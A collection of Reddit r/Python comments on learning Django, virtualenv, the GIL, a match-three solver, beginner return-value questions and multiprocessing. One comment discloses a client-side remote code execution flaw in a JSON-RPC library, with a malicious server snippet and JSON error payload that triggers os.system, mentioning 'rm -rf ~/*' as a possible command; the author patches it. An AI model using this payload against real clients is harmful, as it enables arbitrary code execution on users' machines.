Second, I'm going to recommend that you learn and start with Python 3.4. A lot of people are going to recommend learning 2.7 to you and at this point, I would ignore that advice. First off Python 2.7 is going away and being used less and less. Second there are some bad habits that can be formed in structuring your programs, and handling imports in Python 2.7 that will make the transition to 3.4 more difficult for you. And third, Python 3.4 has better unicode and encoding support that Python 2.7. Other than those things, Python 2.7 and Python 3.4 don't really differ at all syntax wise and you'll be able to backport everything you learn with 3.4 to 2.7 if you ever find yourself NEEDing to use the 2.7 branch. Also, Django 1.7 supports Python 3.4 very well. So let's go with 3.4. Next I recommend you go through the [django tutorial](https://docs.djangoproject.com/en/1.7/intro/tutorial01/). This is perhaps the most complete tutorial and introduction from an open source project, well, ever. It is very complete and will get you familiar with every aspect of the framework. That said, read and try to comprehend as much of it as you can. DO NOT COPY PASTE ANYTHING. I repeat, type shit out by hand, and read everything in the tutorial. It is sooooo worth it. Finally, after you go through the tutorial try to come up with a basic app project idea. Try to build a CMS, or a time tracking website. Work with user authentication, logging in and out, session management, etc. You'll get ideas. Roll with them and try to implement them. Finally, after you feel like you've built something that you want to host on a web server somewhere learn about NGINX, and uWSGI. By the time you actually need to use these things, it will be a couple years from now, and keep in mind that these sorts of tools might not even be the best fit two years from now. There might be something better. Hell, maybe you're the guy who writes the new hotness everyone wants to use. :) Good Luck. If you have any questions let me know. Also, installing django with virtualenv and python 3.4 should looks similar to the following. virtualenv -p python3.4 env source env/bin/activate pip3 install django django-admin.py startproject your_project_name ...DEV STUFF HERE deactivate If you're using Ubuntu 12.04 upgrade to 14.04 or 14.10. Cheers.
use linux, or even mac os. go to your shell. type "python". done. 
I think your advice to not learn virtualenv and pip are misguided. Learning these tools earlier on, will help during learning and are valuable from the standpoint. Second, I have deployed many production apps inside of virtualenv, and in some cases (particularly with automated testing) it is incredibly useful. It is not true that most of the time a single app exists on a single machine. I, at one point, had 16 different apps running on a single server, with rails, django, flask, bottle, and sinatra all playing nice together. Why? because of bundler and virtualenv.
It's true that JSON is more compact than some XML representation of the same data. But it'd take a lot of data for it to be an order of magnitude right? That'd mean that some XML representation of data was 10X larger than JSON, and I don't think that's credible. I'm a fan of JSON for this kind of thing, but not for this reason.
Let's say you have 10 projects, each developed in its venv and you want to use all of them. Then do you add ten directories to your PATH? And if you start a new project in a venv, do you need to modify each time the PATH? How is it simpler than "wpython /path/to/script.py"?
But it requires installation of the project. I develop a project in a venv and I just want to launch it, I don't want to install it. Say I make a utility script and I put it in a venv because I don't want to install its dependencies system-wide. Then how can I use this utility script? I don't want to install it, I just want to start it.
You can do that. But if you have ten projects and you want to call all of them, do you create ten launcher scripts? But even if you want to create a launcher, with wpython you can do that easier: #!/usr/bin/env bash cd /the/directory/where/myscript.py/is/located wpython myscript.py It's quite simple IMO.
float(a) is the floating point equivalent of a. 1000.0 is the floating point equivalent of 1000.
&gt;Remote exception passing (When calling a remote method in a client, exceptions thrown by the server code will be thrown locally!) Be very very careful doing stuff like this. Figuring out classes and evaluating them on the client end is a recipe for security issues. Sure enough looking at the code, this is easy to exploit. Eg. say I'm a malicious hacker, and I manage to redirect your client to talk to my server (eg. DNS poisoning, MITM, whatever). Here's my code (a tiny modificiation of your simpleserver example): #!/usr/bin/python import jrpc class eval(Exception): def __init__(self, arg): self.args=[arg] class SimpleService(jrpc.service.SocketObject): @jrpc.service.method def echo(self, msg): raise eval('__import__("os").system("echo owned")') # Could be rm -rf ~/*, or pretty much anything I want here server = SimpleService(50001, debug = True) #Include the listening port server.run_wait() Your client calls this, and hey presto, I now have remote code execution on their machine. Oops. Note: I've actually exploited a slight bug in your code here to make this easy to illustrate. In exceptions.py, you have: def _get_closest_exception(inheritance_list): for except_type in inheritance_list: if hasattr(sys.modules["__main__"].__builtins__, except_type["class"]): return getattr(sys.modules["__main__"].__builtins__, except_type["class"]) return None I'm guessing that `sys.modules['__main__'].__builtins__` here should actually be `except_type["module"]` (or maybe even doing the importing itself if not in sys.modules yet), unless this is deliberately only looking in `__builtins__` to avoid allowing arbitrary exception classes (which may not be a bad idea, but isn't sufficient). This is why my "eval" class is being looked up in builtins, rather than the module I define it in. However, this bug isn't neccessary for the hack - I can just as easily write a simple TCP server that spits back something like: {"jsonrpc": "2.0", "id": 1, "error": {"message":"")", "code": -32000, "data": {"classes": [{"class": "eval", "module": "__builtins__"}], "args": ["__import__(\"os\").system(\"echo owned\")"]}}} to every request, since its the client side where the vulnerability is anyway.
Not to mention: gzipping your body should take care of most of the repetitive overhead that XML has over JSON.
What are the advantages over the standard python jsonrpc module ? https://pypi.python.org/pypi/python-jsonrpc
Hi Alex Can I ask how it compare itself to rpyc services(see http://rpyc.readthedocs.org/en/latest/docs/services.html#services)?
Have an english list of common words in an array. Permute the key's representations using basic incrementation and at each decryption attempt to check for the existance of common words in the decrypted text. If a decryption results in the production of common words display it to the screen. After running for a while it should show the decrypted message. For performance purposes you only need to do this on the first part of the encrypted text.
I made this yesterday, it's not much, but it was a problem that has been troubling me for some time. The rules of the game are very common: You start with a board with pieces of several colors, and you swap two of them horizontally or vertically. Legal moves must result in at least 3 pieces being next to each other (horizontally or vertically). All matching pieces after a move are removed, and any pieces above them fall down (like being pulled by gravity). I'm making a full game tree (brute force solving). I'm definitely sure it's possible to eliminate several branches though. I *do* have a couple in mind, but since my day job doesn't entail any game development, I'm sensing there may be a whole class of optimization I'm missing. Brute forcing seems that it's going to take longer than the head death of the universe. The specific position I have seems to have 18 starting moves, and games are usually over in about 10-12 moves (but other than that I've not picked up any other data). Can anyone offer any insights? Also, what would it take to make this program resumable and to estimate how long it will take for it to complete? I *do* have the feeling that what I'm asking may be impossible though :) EDIT: It seems there is a bug - there was no reason to avoid swapping a piece with an empty square. I also changed the moves format to a more common XN format, e.g. A7h means 1st column ("A"), 7th row ("7"), and a horizontal swap (to the right).
you should read the sidebar and go to /r/learnpython 
Could somebody explain this to me? This subreddit is already slow, why divide it into two?
&gt; Doesn't work if you can get lists of different sizes, zip would truncate the longer list and you'd miss some values. You can also use: itertools.zip_longest(alist, blist, fillvalue=None) to pad the shorter list with None. (In Python 2, that's spelled "izip_longest".)
In Python 3, there's no itertools.izip, it's just the built-in zip.
It should fail with no employees, since the average of no values is undefined.
Python 3.4 has a statistics module good for this sort of thing: statistics.mean(e.salary for e in employees)
That's irrelevant. When you have a call to an ORM that requests some data, the way that has to work is that it has stop the entire thread of execution to send a network request across to the database, and then wait for a reply. If you're lucky, the data is already cached, but that just means this happened earlier. You don't get away without hanging the entire Python thread, unless you have explicitly built your system around an alternative - eg. having database responses issue callbacks into your app - and SQLAlchemy certainly does not and cannot do that automatically for you.
&gt; If you really wanted to keep it 100% OOP Please don't. http://steve-yegge.blogspot.com.au/2006/03/execution-in-kingdom-of-nouns.html 
You're oversimplifying. If you already have multithreaded operation, then sure, halting a thread waiting on I/O is essentially free. But due to the GIL that is not how Python works by default, and as far as it's concerned, it makes absolutely no difference if it is waiting on an I/O task or on a complex CPU task - that Python interpreter is making no more progress at all until that task completes. As you say, "use gevent.wsgi, mod_wsgi". That is all I was saying, without knowing the exact names of what needs to be used. The important thing is that the bottleneck is not SQLAlchemy, which I'm sure you'd agree with. However, the OP is going to need to consider how their app scales to multiple processes, because even if you can magically replicate your process, that doesn't mean the logic is going to be correct.
Yup. I'm planning to do that. 
What version of Python are you using? If you are using version 2.7, put this at the top of your script: from __future__ import division Note that it has **two** underscores _ at the start **and** end of "future", not just one. Also, this much be the first line of code in your script, before any other imports. If you are using an older version of Python, you can do this: ISI = (random.randint(200,500))/1000.0 to force "true" division instead of integer division. If you are using Python 3, then something weird is happening and you will need to show us the exact code you are using.
&gt; how do I get decimal values Instead of 1000, write 1000.0
I've seen this argument used multiple times and I don't understand what's so hard about using mixed tabs+spaces on one line. You match the indentation of the previous line with tabs and add spaces for alignment... pretty easy
TLS would be sweet, thanks.
From the python side: no recursion, no function calls inside the main loop, lists of int, cython This should cut the time to 1/100. A last small drop once you have the main search down to hours. Finding shortcuts to leave branches is another problem. You world have to guess early that a branch can no longer result in success.
&gt; Yet no where did he say he never even tried He said so himself, three hours before you claimed he didn't. Fail No, I'm not perfect but I do have a problem with lazy people who don't even try and want others to do the work for them, especially homework. I'm a 20 year military veteran with almost an decade in IT. I've worked almost 30 hours straight under the worst conditions too many times to count, and giving up and asking for someone to do something for me because I won't try is not an option. If there's one thing I do have its a strong work ethic. I intensely dislike cheaters and lazy bums, and those that would excuse them since you must identify with such low standards. Over the years I've been on a few programming forums and have asked for and given advice. Its common and widely acceptable to ask for help understanding something or for help with an error. I've never ever seen any forum that doesn't dismiss those asking for someone to do it for them when they obviously haven't attempted to do it themselves, and anyone asking for help to cheat on an assignment. 
That's right. I forget there's a python 3 sometimes because I work in scientific python so much.
I'm always really uncertain when it comes to character encoding, but is latin-1 the right coding to use for Cyrillic? What if you try utf-8 instead?
I don't want to be a jerk but I don't understand how the kid is supposed to use this to learn colours. All the program does is display a random colour when you click the button - there's no way for the user to input a guess on what the colour is named (although this may be difficult given the age of the kid, I don't know when kids usually learn how to write and read but three years old is probably early). It'd be neat if you added three choices as separate buttons below and one of them is the correct answer. If you press the correct button the program plays a happy, short tune - if you press the wrong button, play some sad, shorter tune. As for actual code feedback you should look into the PEP8 style guide on formatting - I took the liberty of reformatting it a bit for you: #!/usr/bin/env python from tkinter import Tk, Button, Canvas import random random_window = Tk() random_window.title('Random Colours') colors = ["red", "orange", "yellow", "green", "blue", "purple", "white", "blue"] def rand_light(): random_light.create_oval(10, 10, 190, 190, fill =random.choice(colors)) rand_button = Button(random_window, text = 'Random', width = 6, command = rand_light) random_light = Canvas(random_window, width = 200, height = 200, bg = 'white') margin_size = 5 random_light.grid(padx = margin_size, pady = margin_size, row = 0, column = 0, columnspan = 3) rand_button.grid(pady = margin_size, row = 1, column = 1) random_window.mainloop()
The simplest algorithmic optimisation is to change how you traverse/generate the tree based on a heuristic, picking the best moves first. Currently you just add all the moves to a list and churn through them in depth-first order. Take the best subgame from your list, find its legal moves, generate the subgame in each case, score each of them, add them to the subgame list, best first. Repeat. There are also some micro-optimisations (as well as everything /u/b0ne123 said). eg. the way you check for matches is wasteful. If you know that pieces[0] and pieces[1] are different, you can check pieces[2] and if that is different from pieces[1] there is no need to check 1,2,3 next time around - you can move straight to 2,3,4. eg. Subgame generation needs to be as cheap as possible. I wouldn't want to use that `to_text` call each time. You're making a board out of a board - why the intermediate text generation step? Ideally you want to be using a representation that you can clone instantly. Personally I probably wouldn't bother with a Cell class for each cell. It looks like a very heavyweight way of representing what is basically one of 4 values. I'd either store the board as a list of integers or as a list of characters (maybe a string). (The 'marked' attribute isn't strictly necessary - you only use it to carry values between the check_matches and clear_won functions. There are easier ways to represent it if you used an integer for board locations instead of a Cell class, for example.)
the idea is that she sits on my lap and i hit the random button and she signs the colour (as she is non verbal). later on, when she is recognising both colours and words, i will add a multiple choice option
I haven't looked through the source significantly, but @tombstone.logs(module_name="HelloWorld", time=datetime.datetime.now()) seems a little odd. You want time to be the start up time of the process? raise ("You have to send the module name in the decorator!") raise("Invalid parameters!") Why are you raising strings? I don't think that's worked since like python2.4. These shouldn't exist at all. They are just squashing other errors. If you really you want it, just make it a positional parameter. Also, if you are going to raise an exception for it, make it a TypeError. Just like TypeError: reversed expected 1 arguments, got 0 Whats going on with: except Exception, e: raise That [massive block of kwargs conditionals](https://github.com/H1ccup/tombstonepy/blob/master/tombstone/modules/tomb.py#L45). You require that module_name is passed in, then you keep testing if module_name is passed in. You can do "module_name" in kwargs also. I would probable make time=None in the __init__ and then `if time is None: time = datetime.datetime.now()` Why are you throwing out the args in the [\_\_init\_\_](https://github.com/H1ccup/tombstonepy/blob/master/tombstone/modules/tomb.py#L5)? If all of this class's methods are static and they all start out with `tomb = TombController()` just make them methods of TombController. No need for the indirection. If you want to isolate them some how as the "view" portion, maybe make them a mix in. I've only really looked at two file. Maybe I got unlucky, but you've got a lot of loose ends hanging around. Why is there a try except raise? Or an [\_\_init\_\_: pass](https://github.com/H1ccup/tombstonepy/blob/master/tombstone/modules/api.py#L5)? Go through again and remove as much as you can. Run pylint on your code, run flake8 on it, run coverage on it, rewrite your testsuite like you think you are losing your mind and need to very small facts. `print "dansebasanti"` isn't going to help me.
Write a quick wrapper around rsync? Or just install `sh` and call rsync from another script?
Check out fabric: http://www.fabfile.org
I don't know the current state of speech recognition software but you could look into using [Julius](http://en.wikipedia.org/wiki/Julius_%28software%29), [Kaldi](http://kaldi.sourceforge.net/) or perhaps [VoxForge](http://www.voxforge.org/) to help with speech development. It's also possible that you could find some gesture recognition software to build upon and have her sign the answer to the camera, check out [this](http://en.wikipedia.org/wiki/Gesture_recognition) Wikipedia article. It's probably difficult but such a noble cause!
It could be, but not everyone does it perfectly all the time. I agree it could be done and isn't too hard, but its now something you have to think about. And something about mixing the two things on one line seems wrong to me.
it will be data in different database. thanks btw
those are some great ideas. i'll look into them. thanks
I suspect that this problem will always be a graph search. Seems like something A* would solve well, provided you come up with a reasonable heuristic.
Some people, including myself, would prefer that this subreddit focus on "news about the dynamic, interpreted, interactive, object-oriented, extensible programming language Python" as stated in the sidebar. Especially since /r/learnpython is an exceptional place to get help and feedback. However, the numerous mods here are pretty much never around and don't give a fuck so /r/python ends up being a place to post whatever homework assignments you like.
postgresql.
I will use it based solely on the fact that the name is one letter away from Brinstar
I believe that postgresql has excellent replication capabilities: https://wiki.postgresql.org/wiki/Replication,_Clustering,_and_Connection_Pooling I believe there is quite a range of options available depending on exactly what you're after, so it's definitely worth investigating as it could save you a lot of work!
Thanks for posting this. Believe it or not, one of my to-dos today was to look into adding websocket support to a django back-end! :-)
I'm not entirely sure how to apply A* to this problem. The problem space is not a grid, I don't even know the size of the graphi to search. Not to mention that each move depends on all the previous moves to calculate. I'd love to use A* on this, if possible, but I don't see how...
Awesome, this is a really cool exploit. I made a patch on github that verifies the thing you pull out of builtins is a subclass of BaseException and if it's not returns a ServerError instead. Thanks for the work!
Awesome! Let me know if you need anything. 
&gt; No recursion I'm not even sure where to start doing this without recursion. In my mind, this has recursion written all over it... &gt; No function calls inside the main loop Fair enough &gt; Lists of int Even more fair. &gt; Cython I'll definitely try that, to see a performance gain, but only when I can fix the other two parts :) &gt; Finding shortcuts to leave branches is another problem. You world have to guess early that a branch can no longer result in success. I was hoping for some insights on these. Any branch culling technique would be very useful. I've thought of a couple myself: 1. If there are 2 or less items of a single color, game is unwinnable 2. If there are more than two consecutive empty squares at the bottom, and in the middle, game is unwinnable (I can't prove this though) 3. If a board position has been repeated, there's no reason to continue searching solutions for this (this will eliminate duplicates, but this will probably require heaps and heaps of memory).
A* doesn't require a grid. The grid is a common space that needs searching, but A* is a general purpose search/planning algorithm that just needs you to be able to represent the problem as a set of states with neighbouring states, where there are a finite number of operations that can change those states, and where you have some way of estimating how many more changes you will need to make to reach a goal state. However, I don't think A* is a good match here - it works best on graphs rather than trees, and although a match-three state-space can technically be a graph the high branching factor makes it much more tree-like. My suggestion in the other comment of using a best-first search is basically taking the heuristic aspect from A* which will (usually) increase the search speed. The difference is that A* would also incorporate the number of moves taken so far - important if you need to find the *best* way to solve the board, but which is actually unnecessarily if you're just interested in finding *any* solution as soon as possible.
no the queries are. (ie: io operations)
As a scientist one of the key reasons the scientific has moved over to python is its simplicity. The vast majority of undergraduate programs introduce little to no programming experience outside of engineering schools. So what ends up happening is you get a lot of very green graduate students that enter their first year and they get a research project dropped in their laps along with a course load. They want to get up and running quickly while leaving a trail that another future student can copy. The simpler the coding they have to do the better (sure it might later be better optimized). So the problems I see with the article are as follows: 1. You start off as you are talking to a beginner with suggestions on how to install packages but then quickly jump into very detailed screenshots (screenshots not embedded notebook output I might add). 2. There is no explanation to what is going on in any of the screenshots. Anyone not in your head is going to have trouble parsing exactly what you are trying to do. Sure we can sit there and read through the code but thats going to cause many python native people to give up right there. 3. If your key audience is the scientific python community consider most people under the age of 30-35 in the scientific community have never used a language other than python, ruby or labview. Even then the engineers are going to have a sharp divide between python, java, and C++ if they are not CS/CE. (the exception might be some really crazy physics guys but even the astrophysics community I dealt with was almost entirely python)
&gt; The simplest algorithmic optimisation is to change how you traverse/generate the tree based on a heuristic, picking the best moves first. The problem is that I don't necessarily know which is the best move. I'm not trying for best score, the win condition is to clear the whole board. &gt; the way you check for matches is wasteful. It's very wasteful. I should be checking only around the swap! Instead of checking the whole 8x8 board, I should be checking a maximum 6x5 area (or 5x6 for vertical swap), from two pieces left of the left swapped piece to two pieces right of the right swapped field, and 2 pieces up or down from both the swapped pieces (rotate by 90&amp;deg; if needed). This may even be shortened to a cross of the same size. &gt; Ideally you want to be using a representation that you can clone instantly I understand and I agree. In my defense, I made this in a quite short time and I didn't know where I was going from the start :)
i've tried Pgpool-II but i never been able to use it correctly or make it works .... but thanks. I also would like to know if there is a python module to compare data based on date and data. As my data is based on json i thought making it myself using https://pypi.python.org/pypi/jsonpatch fr versionning but i don't want to re invent the wheel if it exist. Thanks anyway :)
&gt;The celery task would handle the actual document processing and the post to the third party. In fact, you could easily split this up into several chained tasks to keep the programming nice, clean and easy. If a request came in from a browser, how would the celery task be able to send back a response? Wouldn't the client browser need to poll the webserver so that the webserver could check if the task was complete?
Thanks for the leads. I started with Full Stack Python, but this doesn't seem to be working on the mac. Following the steps to the later, but things seem to be installing wrong or not installing at all, and I'm getting thrown off by it. I'll check out Real Python and see if I want to lay out money for it. I was hoping for a free option, but I guess if the best way to learn is to pay, then that's that.
&gt; The problem is that I don't necessarily know which is the best move. I'm not trying for best score, the win condition is to clear the whole board. You don't need to *know*, you just need a good guess that is better than chance. If the win condition is to clear the board, then rank boards by how few tiles are left. The more productive swaps will rise to the top.
Each move always clears 3-14 tiles (14 is very rare of course, 3 is by far the most common). A move that will clear 10 tiles is not necessarily the best move though, it may throw you in a local optimum, which may be far from the best solution.
&gt; I'm not even sure where to start doing this without recursion. In my mind, this has recursion written all over it... Recursion can always be rewritten as iteration. The recursion in this case is implicitly creating a stack of substates (which represents one depth-first iteration of the game tree). So you can replace that with an explicit structure of substates. Vague pseudocode: subgames = [MatchThreeGame(initial_pos)] while len(subgames) &gt; 0: current_subgame = subgames.pop(0) if current_subgame.board.pieces_left == 0: print('Found it!!!!') break # or return, whatever legal_moves = current_subgame.board.find_legal_moves() for move in legal_moves: new_board = current_subgame.generate_new_board_from_move(*move) new_subgame = MatchThreeGame(self.board.to_text()) # this is how you deduce the solution, from this linked list, working back from solution to start state. # NB. You might need to store the previous move alongside the subgame as well. # Perhaps make the list a tuple of (move, resulting_subgame)? First move is None, obviously. new_subgame.predecessor = current_subgame subgames.append(new_subgame) # ideally change this to a sorted list, ordered by subgame quality (EDIT: improved pseudocode) &gt; If a board position has been repeated, there's no reason to continue searching solutions for this (this will eliminate duplicates, but this will probably require heaps and heaps of memory). You are storing plenty of previous game states already - it's just that they're hidden in local variables so you can't access them! This is another benefit of the iterative approach - the data is right there. However, I doubt it's worth the effort. You can significantly speed up the querying by storing and comparing hashes of the game state to make comparisons much quicker, but the number of times you'll come across a duplicate state is likely to be so low that the effort you save is not worth it. (But feel free to try both ways and profile the results.) 
That doesn't matter. Every potential solution is going to be evaluated sooner or later (or, more accurately, half of them will, on average). All you need to do is bias the search so that you look at the more promising ones first. Local optima are not a problem - the point here is that you work your way through local optima until you find a global optimum. Unless the search space is entirely random then that is always going to be better than searching through random choices looking for a global optimum.
ImportError: No module named site is what i got.
Thank you for the feedback. I shall definitely improve my code. 
[This is a gist I wrote](https://gist.github.com/blakev/697acbc242a683d4eb38) that cleans up a lot of boiler-plate for using an SSH object like a programatic terminal.
expecting an orm to implement efficient queries is the users fault. 
It's not very explicit that you listen on all interfaces with the port -- while as you should be doing a firewall that rejects all connections by default, your example allude to this being a local setup only. For Python RPC, I like this long running library: https://pypi.python.org/pypi/Pyro4 Main advantage is the object broker. I don't want to remember port numbers, but names.
*…like a boss?* 
That's not what the OP is saying, or at least how I interpreted it. The browser request gets a 200/201 and is done. Processing happens, and the celery task makes a new, POST request to some other url with the processed xml data. If the response needs to come back to the browser after it was processed, then the only way to do 10000/minute is would be with lots and lots of hardware. 
The examples are meant to be simple, the constructors of all these objects allow you to specify a specify host to listen on (in service objects) or connect to (in proxy objects). My original implementation included named objects but I opted to remove it because of the unnecessary complexity it adds.
&gt; But due to the GIL that is not how Python works by default, and as far as it's concerned, it makes absolutely no difference if it is waiting on an I/O task or on a complex CPU task - that Python interpreter is making no more progress at all until that task completes. take a look at https://wiki.python.org/moin/GlobalInterpreterLock, particularly the part where it says: &gt; Note that potentially blocking or long-running operations, **such as I/O**, image processing, and NumPy number crunching, **happen outside the GIL**. Therefore it is only in multithreaded programs that spend a lot of time inside the GIL, interpreting CPython bytecode, that the GIL becomes a bottleneck. see slide 10 at http://www.dabeaz.com/python/UnderstandingGIL.pdf for more detail.
It's been a long while since I played with python on Mac OS X (although I'm considering moving back), but IIRC even though python comes as an integral part of the operating system, you really, really don't want to touch that version if you can avoid it. I seem to be saying this a lot, to where I feel a bit like an advertisement for 'em, but have you looked at [Anaconda](http://continuum.io/downloads)? Again, its one of those things where yes, you can indeed 'roll your own' and get all the same bits and pieces together using the system package tools, or things like 'homebrew' (which didn't exist when I was still puttering around with Mac)... if you're willing to take the time and work thru the speed bumps. If you'd rather just have a separate development environment that is more or less turn-key... something like Anaconda is about as quick and painless as they get, as its installed to your *user* directory, not the system, so no super-user privileges needed, no worries about mucking up your system python, etc. The commands for creating/using virtual environments are different than standard (i.e. what is discussed in most tutorials such as Real Python) but thats relatively simple to work around and a small price to pay in my opinion.
Another very well written document that might be of interest would be '[Python 101](http://www.blog.pythonlibrary.org/2014/06/03/python-101-book-published-today/)' from Mike Driscoll (blogs @ [the Mouse &amp; the Python](http://www.blog.pythonlibrary.org/)). Covers much of the same ground as part 1 of the 'Real Python' series, but with both a little more depth of detail and breadth of topics.
Can you tell us how you were able to code so many different games? Or did you somehow just design the front end and attach the games behind it?
Is this opensource? I would love to see the code.
joins in the ORM layer has a specific use case that is well established. if you have a table with several many to many relationships, it is often more efficient to prefetch the related-through-m2m rows in separate queries and then join the data in the Object layer in the ORM. this is done to prevent having to execute 1 additional query per row of the table being queried while fetching m2m related rows. it is much more efficient to perform 1 query on each of the related tables and join them in the ORM. 
&gt; The benefits of docker extend beyond being a super-virtualenv. They make application deployments and dependency management straight forward Actually, that's only partially true. Deployment pains are definitely alleviated, but dependency management *within* the container is still left as an exercise for the reader. One can use unionfs-like concepts without needing to virtualize the rest of the runtime. (This is essentially what conda does with its environments.)
You should use /r/learnpython for this. But I'll give you a hint, read this article: http://effbot.org/zone/python-list.htm
Correct me if I'm wrong but this all seems rather... redundant? You're presumably using a form of valid authentication so the running ssh client already knows the host key etc. doesn't it? Just run ssh -v &lt;ip&gt; and look for 'Server host key'. And if you have remote terminal access, you can just get this information straight from the source.
I am not sure why you are forcing the list comprehension, don't use single letter variables and don't (pretty much ever) do import * import random int_list = [] count = 0 for _ in range(10): new_int = random.randrange(1,11) if new_int == 1: count += 1 int_list.append(new_int) print "found {} ones".format(count) print sum(int_list) If you wanted to do it your way... you can use the "count" function of lists. print l.count(1)
How difficult would it be to tweak this to work with windows? I'm new to BLE and am fairly lost at the moment.
Is there any way to make code like this agnostic to which realtime API service is used?
Great response. Thanks for sharing your experience.
This fixed it. Thank you very much. 
Have fun: https://developers.google.com/youtube/ There are code samples in many different languages. If they allow comment bots (which I'm gonna guess they don't), it would be in there somewhere.
Thanks! I might re use some of that for a project I'm doing.
And it's not the only place where ORM application-side joins happen.
I thought this was going to be about long periods of time :P
The code is intended to be agnostic since it targets Fanout's open "GRIP" protocol. For example, you can run your own Pushpin instance instead of using the Fanout cloud service, without any code changes in the Django app. I agree that compatibility with other push services would be nice, but there aren't any services other than Fanout that can do what is described in the article.
Make the IDE a darker colour. 
Divide by 1000.0 instead
Or just use 0.2 +( random.random() * 0.3 )
1) take breaks - get up, stretch, walk around, focus on distance objects 2) music 3) keep hydrated 4) don't be afraid of taking (short) breaks for sites like reddit/etc 5) dark color theme for your editor 
Go read http://www.gutenberg.org/ebooks/729. 
&gt; However, I doubt it's worth the effort. Python has no tail recursion and is, compared to iteration, awfully slow. As long as it takes years for the recursion to solve, iteration wont help. It is just so much faster it reduces a hour to minutes. I've build brute-force in python before, with billions of branches and iteration is much better.
Bookie is my bookmark app that uses SqlAlchemy and tests. There's docs on running the tests here: https://github.com/bookieio/Bookie and http://docs.bmark.us/en/latest/tests.html It's not perfect but hopefully useful to you. 
So is the multiprocessing module kind of like Hadoop? 
Alright, I've upvoted you. It works now, btw. uninstalled and reinstalled, and i get my nice little command prompt window in its full glory this time :)
x = choosecave()
When you return a variable, you're not making the variable available outside of the function, you're returning its contents. You need to put those contents somewhere.
Think of a function with a return statement as a placeholder for an unknown variable. cave = chooseCave() is essentially saying "cave = whatever chooseCave() returns"
Why is this in Comic Sans? And return is a statement, not a function, so to return the value of cave, you would use: return cave rather than: return(cave) 
codecademy.com has a well written interactive on-line python tutorial if you would be interested.
I starting coding in comic sans as a joke. Then it just stuck. And thank you 
Thanks again
Yay! \o/
I'm still confused and not sure what to do. 
The problem here is one of scope. Whenever you define a function in Python, any variables you declare inside that function disappear when the function finishes. In this case, you have the variable 'cave', but since you declared it inside 'chooseCave()' that variable, the name you gave to it, disappears. What 'return cave' does is it says "Whenever you see 'chooseCave()', replace that, outside the funciton, with the value of cave from inside the function." So if for instance, the user puts in '2': then basically what your program is saying is '2' print(cave) but it doesn't know what 'cave' is, because only your function can see that variable. So what you have to do is assign the value to a variable outside the function and you can print that new variable. For instance, replace the last two lines in your program with: chosen_cave = chooseCave() print(chosen_cave) And what your program basically says (assuming the user enters '2') chosen_cave = '2' print(chosen_cave)
a few other things that will make your program look a bit nicer: as some one else said, 'return' isn't a function, so it doesn't need quotes around what you are returning the 'input()' function can take an optional 'prompt' argument, which will display the prompt before getting input. So instead of 'print(... input()' just use 'cave = input("Do ... 2?")'. since the 'return' is indented the same as the rest of the 'while' block, it will return regardless of whether cave == 1 or 2. You need to unindent the 'return' to get the result you desire.
This doesn't sound like a long-period-of-time issue. It sounds like a motivation / writer's block issue. One thing that helps me is if I open up Notepad and just start talking to myself by typing. What do I need to do? What are the pieces of the problem, and what are the easiest steps? What's stopping me?
Thanks to all of you that took the time to respond. 
The post was about joining 100GB of csv files. Any similarities to hadoop would be a stretch...
So how are they different? I apologize preemptively, I'm unfamiliar with either. 
I would recommend using a twitter library to take care of the API heavy lifting.[Tweepy](http://tweepy.org) is a good one that really simplifies interacting with twitter.
100 hours straight is a real killer, I did that whilst working on 1 game, it helps to know what you want to do. I was writing in assembly, and so it was a lot of code that needed writing but I knew what was required and how I was going to do it.
Those models, types, relationships and abstractions are there also to eliminate unnecessary queries you might have done otherwise (e.g. through the use of Repository and Unit of Work pattern). Eliminating just a few roundtrips to your DB is probably worth more than even very baroque abstraction layer.
At a very high level, Hadoop is a framework intended for performing parallel computation on large datasets (think terabyte scale or larger) using the map-reduce idiom, generally using clusters of many machines, each with many processors (i.e. not a single node with multiprocessors as seen here). The multiprocessing module is just a library containing various tools and synchronization primitives for writing parallel code in python. So in the sense that they both are used for parallel computation I guess you could say they are similar. But hadoop is really much more complex and gives you a lot more tools for performing very large computations. It does lock you into the map-reduce idiom though. On the other hand, the multiprocessing module provides more basic parallel functionality for writing scripts to perform smaller jobs like this one, and doesn't necessarily lock you into any particular idiom of parallel programming. This is a bit of a simplification, but it gets the general idea across
What's your experience with Gunnars? Do they help a lot?
Looks like they're processing one row per process. I'm surprised it's any quicker with all that serialization and deserialization going on. Why not multiple rows per process? 
&gt; they are the same people who complains that developers "don't understand the functionalities of our products, and just code blindly". I got out of full time software development because of exactly these kinds of idiots. A developer will code exactly to the specification given, so if these people who are putting in zero effort are complaining the developers aren't giving them what they want, its because they don't know what they want, are changing their mind every 15 minutes, are poor communicators, or just generally pathetic human beings. Don't be one of them. 
I recently completed a project which used multiprocessing to read million-line CSV files, transform the data, and write it to a database. (This wasn't a situation where a bulk load from CSV would have worked). I started off going line by line, processing and inserting the data as such. Unfortunately, 10 hours of processing time per file just wasn't going to work. Breaking the work up and handing it off to multiple processes brought that down to about 2 hours. Finding the bottlenecks in the process brought it down to about 1 hour. Renting 8 cores on AWS brought it down to about 20 minutes. It was a fun project and a great learning experience since it was my first time working with multiprocessing. After some optimizations I had my program consuming ~700 lines from the CSV and producing about 25,000 database inserts every second. 
Thanks. Solarized worked for me. Im a freshman in high school taking an AP computer science class, it was a combination of this and F.lux that helped me stay focused.
I think the goal here is to script this to do a whole list of devices and compare it against a known list. Good for audit purposes I suppose?
you are getting schooled by the author of sqlalchemy. you should delete your account and go switch to ruby to save face. 
Well, here I thought using the mac's python was a smart thing. Huh. Anaconda looks interesting, thank you. This may be just what I need. Really, I just want to learn enough so I can put up my own server, listening for what I want, responding as needed. Just enough to make some neat if simplified web apps.
Thanks for the link! I'll check it out.
I highly recommend the dark theme. My eyes feel far less tired with a good theme for PyCharm or Eclipse. Lookup the darcula theme as a good starting point. 
Yeah, that edit went up after my reply :)
Touche. 
Why don't you go f.. ind a useful project to contribute to?! We don't need more spammers on youtube. There's enough of them already.
For concurrency with IO operations, I always use gevent. Super easy to use. eg from gevent.pool import Pool pool = Pool(10) # number of greenlets pool.imap_unordered(function_to_run, iterable_of_arguments) Function to run might be a function which calls `requests.get(url)`, and iterable of arguments could be a list of URLs. Even though you have the GIL, you can still make IO ops in parallel and that's the bottleneck for most things that will be grabbing web pages. You need to import and monkey patch sockets which is a one liner as well. Just a few lines and my sequential crawler made the requests concurrently. Since it'd time out here and there since some URLs were bad, a pool of 10+ threads greatly increased the speed, way more than 10 fold.
Thanks for being helpfull =). Have a nice day.
